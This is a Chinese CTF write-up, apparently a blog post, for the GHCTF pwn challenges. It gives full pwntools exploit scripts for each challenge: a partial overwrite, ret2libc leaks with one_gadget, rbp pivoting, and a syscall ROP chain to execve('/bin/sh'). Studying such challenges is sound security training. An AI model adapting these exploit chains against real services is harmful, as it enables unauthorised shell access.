---
title: GHCTF PWN WP
date: '2025-03-05 18:58:43'
updated: '2025-04-07 21:33:52'
---
## Hello_world
程序开了 PIE 保护，没有 canary，有后门函数

利用 partial_overwrite 来修改返回地址到后门函数

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
# link=process("./hw")
link=remote("node2.anna.nssctf.cn",28370)

link.recvuntil(b'pwner!')
payload=b'a'*0x28+b'\xc1'

# gdb.attach(link)
# pause()

link.send(payload)

link.interactive()
```

## ret2libc1
没有 canary 和 PIE

![](/images/98374474e5dbb17dfa7f473914e3fc70.png)

程序打印出来有 5 个选项，但是实际上还有第六个隐藏了的：

![](/images/0b99371cb5f70e6f371135f5ca6c138c.png)

隐藏选项跟前面这个 hell_money 搭配可以直接钱生钱

![](/images/8bb6798bb378d434fd43fa3769ab9695.png)

然后进到 shop 函数里面就可以得到一个很长的 read：

![](/images/364daa2b65b86aab73aafc97033ae9ae.png)

后面就是用 ROP 泄露 libc 地址，题目还给了 libc 文件，可以直接执行 one_gadget

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
# link=process("./libc1")
link=remote("node2.anna.nssctf.cn",28543)
elf=ELF("./libc1")
libc=ELF("./libc.so.6")

rdi=0x400d73
puts_got=elf.got[b'puts']
puts=elf.plt[b'puts']
read=0x400B1E
main=0x400C4F

link.recvuntil(b'check youer money')
link.send(b'3')
link.send(b'1000')
link.recvuntil(b'check youer money')
link.send(b'7')
link.recvuntil(b'exchange?')
link.send(b'1000')
link.recvuntil(b'check youer money')
link.send(b'5')

# gdb.attach(link)
# pause()

link.recvuntil(b'it!!!')
payload=b'a'*0x48+p64(rdi)+p64(puts_got)+p64(puts)+p64(read)
link.send(payload)

# gdb.attach(link)
# pause()

puts_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))
libc_base=puts_addr-libc.sym[b'puts']
print(hex(libc_base))

# gdb.attach(link)
# pause()

link.recvuntil(b'it!!!')
ogg=[0x4527a,0xf03a4,0xf1247]
payload=b'a'*0x48+p64(libc_base+ogg[2])
link.send(payload)

link.interactive()
```

## ret2libc2
![](/images/2d7717bfc0d532d9727f6a773c98ce1e.png)

没有 canary 和 PIE

![](/images/695856f4114be2d5e90ca4b2d35a44bd.png)

一上来直接就给了栈溢出，溢出了 0x28 个字节

题目还给了 ld 文件和 libc 文件，可以用 one_gadget

![](/images/067f1d804300e303527ae4db5fc29623.png)

发现在 read 之后把读取的内容指针存到 rax 当中，而上面的 printf 也是将 rax 中的指针当作内容输出

所以可以用 read 劫持返回地址之后跳回 printf 函数将栈上的 libc 地址泄露出来，然后就会再回到 read 函数

### 重点：控制`RBP`
之前做的 ret2libc 类型的题目没遇到要求控制 rbp 的，这次第一次遇见，

在跳回 printf 之后因为 read 是按照 rbp 偏移向栈上读入的，直接用`b'a'`一路覆盖到返回地址把 rbp 给搞非法了

到了调用 read 的时候直接 EOF 了...

```python
printf=0x401227
payload=b'%7$p\n' #加了个换行符方便后面recvline
payload=payload.ljust(0x30,b'a')
payload+=p64(bss)+p64(printf) #把rbp劫持到了bss段
link.recvuntil(b'magic')
link.send(payload)
```

接着是接收 libc 地址，好久没试过接收 printf 泄露出来的地址了

```python
link.recvline()
libc_addr=int(link.recvline()[:14],16)
print(hex(libc_addr))
libc_base=libc_addr-0x029d90
print(hex(libc_base))
```

动调时候发现最后栈溢出修改返回地址到 one_gadget 时也要控制 rbp，不然因为 rbp 非法没办法执行 push

```python
payload=b'a'*0x30+p64(bss)+p64(libc_base+ogg[6])
link.recvuntil(b'magic')
link.send(payload)
```

exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
# link=process("./ret2libc2")
link=remote("node2.anna.nssctf.cn",28479)
elf=ELF("./ret2libc2")
libc=ELF("./libc.so.6")

ogg=[0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
bss=0x404060+0x140
ret=0x40101a
leave_ret=0x401272

system=0x050d70
binsh=0x1d8678
rdi=0x2a3e5

# gdb.attach(link)
# pause()

printf=0x401227
payload=b'%7$p\n'
payload=payload.ljust(0x30,b'a')
payload+=p64(bss)+p64(printf)
link.recvuntil(b'magic')
link.send(payload)

link.recvline()
libc_addr=int(link.recvline()[:14],16)
print(hex(libc_addr))
libc_base=libc_addr-0x029d90
print(hex(libc_base))

# gdb.attach(link)
# pause()

# payload=p64(libc_base+rdi)+p64(libc_base+binsh)+p64(libc_base+system)
# payload=payload.ljust(0x30,b'a')
# payload+=p64(bss-0x38)+p64(leave_ret)
# payload=b'a'*0x30+p64(bss)+p64(libc_base+rdi)+p64(libc_base+binsh)+p64(libc_base+system)
payload=b'a'*0x30+p64(bss)+p64(libc_base+ogg[6])
link.recvuntil(b'magic')
link.send(payload)

link.interactive()
```

## 你真的会布栈吗？
非常简洁的程序，汇编一眼看完了...还没遇见过纯栈风水题...

给了 gadgets：

![](/images/b1795dbb2737c06deee255a31eb78d50.jpeg)

看见有`syscall` 指令，没有沙盒，考虑 `syscall` 执行`execve("/bin/sh",0,0)`来 getshell

题目在 banner 中间夹带了 rsp 的地址，可以用来存 `"/bin/sh"`

（刚拿到题目的时候注意到了，但是想着想着就忘了...）

![](/images/b6b68d1d47fb8e1ff6f9787caf622f7c.png)

```python
rsp_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(rsp_addr))
```

程序在打印完 banner 之后就是直接 read 进栈顶，然后就跳转到 rsp 的位置接着执行，

没有返回地址，不用劫持

但是，题目没有用到 `ret` 指令，而是`jmp [rsp]`，这样在跳转的时候 rsp 并没有变化，

如果接着的是 pop 指令就会直接把当前指令的地址 pop 出去，

所以选 gadget 的时候选了先 `pop rbx` 的 gadget，先把没用的数据 pop 到不会影响到 ROP 的寄存器里，

![](/images/e546cd4b5a1a9d2b06644dca7880988d.png)

再接着将要控制的寄存器值 pop 进对应的寄存器，这里的 `pop r15` 接着 `jmp r15` 就相当于`ret`

如果要控制 `rsi`、`rdi` 两个寄存器就利用`pop r15``jmp r15`跳回到 `pop rsi`语句再来控制



大体思路：先调用 read 往 rsp_addr 写入 `"/bin/sh"`，然后调用`execve("/bin/sh",0,0)`，

`read(fd,addr,count)`

1. `rax` = 0 (系统调用号)
2. `rdi` = 0
3. `rsi` = rsp_addr
4. `rdx` >= 7 (动调可以知道在程序返回时 rdx 没变，还是 0x539，不需要控制)

`execve(path,argv,envp)`

1. `rax` = 59 (系统调用号)
2. `rdi` = rsp_addr
3. `rsi` = 0
4. `rdx` = 0

`rax` 的控制：

![](/images/ebee61c45604ab444c7f9d337c139e1a.png)

选取的 gadgets：

```python
gadgets=0x401017
rbx_r13_r15j=0x401019
xchg=0x40100C
jrsp=0x40100E
rbx_ret=0x401011
xor=0x401021
```

调用 read：

```python
payload=p64(rbx_r13_r15j)+p64(0)+p64(xchg)+p64(rbx_r13_r15j)+p64(0)+p64(gadgets) #控制rax为0，调用read
payload+=p64(rsp_addr)+p64(0)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(syscall) #read参数
```

### 重点：控制 RDX
唯一能控制 rdx 的 gadget 就是`xor rdx,rdx; jmp r15`，但是如果利用`pop r15``jmp r15`跳到这个 gadget 执行的话，r15 的位置始终在 gadget 的位置，程序就会陷入死循环

所以得通过别的方式跳转到控制 rdx 的 gadget，在 clby 师傅提示之下，发现可以利用![](/images/81bc71d8d5acabab16e623f14f260b4a.png)

这个 gadget，把 rbx 用来 ROP，把 ROP 链接着本来的 getshell 链写下去，

这样就可以在不动 rsp 和 r15 的情况下执行控制 rdx 的 gadget，

用`pop r15``jmp r15`跳到这个 gadget ，r15 就指向 `add rbx,8`这个指令，等到执行完`xor rdx,rdx; jmp r15`，就会回到这个指令，循环`add rbx,8; jmp [rbx]`就相当于在 `ret`，提前写的 rbx ROP 链就是这样接着执行下去的（只要不修改 r15，并且调用到最后有 `jmp r15`）

然后把利用前面得到的 rsp 地址加上偏移得出 rbx ROP 的地址赋给 rbx（初始记得减 8），

在 rbx ROP 链上写上`xor rdx,rdx; jmp r15`的地址，再接着跳回到 rsp 的 gadget（这个时候 rsp 指向的是原本 getshell 链后面开始调用 execve 的地址）

这样最后就实现了将 rdx 设为 0，回到调用 execve 的 ROP 链上了

```python
payload+=p64(rbx_r13_r15j)+p64(0)+p64(gadgets) #准备控制rbx
payload+=p64(0xdeadbeef)+p64(0xdeadbeef)+p64(rsp_addr+0xd8-0x8)+p64(0xdeadbeef)+p64(rbx_ret) #控制rbx到rbx ROP位置

#跳转到rbx相关语句时rsp位置:
payload+=p64(rbx_r13_r15j)+p64(59)+p64(xchg)+p64(rbx_r13_r15j)+p64(0)+p64(gadgets) #控制rax为59，调用execve
payload+=p64(0)+p64(rsp_addr)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(syscall)

#rbx ROP:
payload+=p64(xor)+p64(jrsp) #add rbx,8;jmp rbx类似ret，用来跳转到清空rdx的gadget，然后再跳回上面rsp的位置继续执行
link.send(payload)
```



完整 exp：

```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'
# link=process("./stack")
link=remote("node2.anna.nssctf.cn",28910)

syscall=0x401077

# gdb.attach(link)
rsp_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(rsp_addr))

# gdb.attach(link)
# pause()

gadgets=0x401017
rbx_r13_r15j=0x401019
xchg=0x40100C
jrsp=0x40100E
rbx_ret=0x401011
xor=0x401021

payload=p64(rbx_r13_r15j)+p64(0)+p64(xchg)+p64(rbx_r13_r15j)+p64(0)+p64(gadgets) #控制rax为0，调用read
payload+=p64(rsp_addr)+p64(0)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(syscall) #read参数
payload+=p64(rbx_r13_r15j)+p64(0)+p64(gadgets) #准备控制rbx
payload+=p64(0xdeadbeef)+p64(0xdeadbeef)+p64(rsp_addr+0xd8-0x8)+p64(0xdeadbeef)+p64(rbx_ret) #控制rbx到rbx ROP位置

#跳转到rbx相关语句时rsp位置:
payload+=p64(rbx_r13_r15j)+p64(59)+p64(xchg)+p64(rbx_r13_r15j)+p64(0)+p64(gadgets) #控制rax为59，调用execve
payload+=p64(0)+p64(rsp_addr)+p64(0xdeadbeef)+p64(0xdeadbeef)+p64(syscall)

#rbx ROP:
payload+=p64(xor)+p64(jrsp) #add rbx,8;jmp rbx类似ret，用来跳转到清空rdx的gadget，然后再跳回上面rsp的位置继续执行
link.send(payload)

sleep(1)
link.send(b'/bin/sh\x00')

link.interactive()
```

